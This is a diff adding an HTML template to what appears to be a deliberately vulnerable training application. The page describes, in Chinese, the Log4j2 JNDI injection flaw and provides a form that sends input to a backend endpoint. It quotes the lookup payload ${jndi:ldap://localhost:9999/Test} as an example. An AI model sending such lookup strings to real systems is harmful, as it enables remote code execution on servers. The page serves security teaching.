@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{commons/commons::head}"></div>
+
+<body>
+<div class="layuimini-container">
+    <div class="layuimini-main">
+        <div class="layui-row layui-col-space15">
+            <div class="layui-col-md12">
+                <div class="layui-row layui-col-space10">
+                    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 20px;">
+                        <legend>Log4j JNDI注入</legend>
+                    </fieldset>
+                    <!--漏洞简介-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>漏洞描述</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <p>Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。</p>
+                                <p>这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容的ldap协议内容（如：${jndi:ldap://localhost:9999/Test}），</p>
+                                <p>该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</p>
+                            </div>
+                        </div>
+                    </div>
+                    <!--漏洞测试-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-hand-o-down icon"></i>漏洞测试</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <form class="layui-form" id="form" th:action="@{/home/log4j}" method="get">
+                                    <div class="layui-form-item">
+                                        <label class="layui-form-label">Content: </label>
+                                        <div class="layui-input-block">
+                                            <input type="text" name="content" id="content" lay-verify="required"
+                                                   lay-reqtext="内容不能为空" autocomplete="off" class="layui-input">
+                                        </div>
+                                    </div>
+                                    <div class="layui-form-item">
+                                        <div class="layui-input-block">
+                                            <button type="button" id="submit" class="layui-btn" lay-submit=""
+                                                    lay-filter="demo1">立即提交
+                                            </button>
+                                            <button type="reset" class="layui-btn layui-btn-primary">重置</button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    <!--执行结果-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>测试结果</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <!--                                <pre th:text="${results}" style="color: red;font-size: 15px;"></pre>-->
+                                <pre id="results" style="color: red;font-size: 15px;"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div th:replace="~{commons/commons::script}">
+</div>
+
+<script>
+    $("#submit").click(function () {
+
+        var content = $("#content").val();
+        if (content.length === 0) {
+            return;
+        }
+        $.ajax({
+            url: "[[@{/home/log4j}]]",
+            type: "get",
+            data: {content : content},
+            success: function (result) {
+                $("#results").empty();
+                $("#results").append(he.escape(result));
+            },
+            error: function () {
+                alert("请求发送失败！")
+            },
+        })
+    })
+</script>
+</body>
+</html>
